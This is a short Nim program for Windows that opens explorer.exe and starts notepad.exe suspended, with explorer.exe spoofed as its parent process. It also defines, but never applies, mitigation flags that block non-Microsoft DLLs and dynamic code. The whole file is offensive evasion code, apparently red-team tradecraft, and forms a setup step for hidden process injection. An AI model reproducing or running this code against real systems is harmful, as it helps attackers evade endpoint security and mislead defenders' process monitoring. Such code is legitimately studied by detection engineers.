import winim 
import strformat
import os
import osproc

const
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44 #Gr33tz to @_RastaMouse ;)
    PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))
proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process_name:
                pid = entry.th32ProcessID
                break

    return pid

proc startExplorerProcess(processName: string): PROCESS_INFORMATION =
    var
        si: STARTUPINFOEX
        pi: PROCESS_INFORMATION
        ps: SECURITY_ATTRIBUTES
        ts: SECURITY_ATTRIBUTES
        policy: DWORD64
        lpSize: SIZE_T
        res: WINBOOL

    si.StartupInfo.cb = sizeof(si).cint
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint

    InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE or PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON

    var processId = GetProcessByName("explorer.exe")
    if processId == 0:
        echo "[EXPOLOROR SPOOFING] Failed to find explorer.exe process"
        return
    var parentHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)

    res = UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
        addr parentHandle,
        sizeof(parentHandle),
        NULL,
        NULL
    )

    res = CreateProcess(
        NULL,
        newWideCString(processName),
        ps,
        ts, 
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    )

    if res == FALSE:
        echo fmt"[EXPOLOROR SPOOFING] Failed to start process: {processName}"
        return

    echo fmt"[EXPOLOROR SPOOFING] Started process {processName} with PID: {pi.dwProcessId}"
    return pi

discard startExplorerProcess("notepad.exe")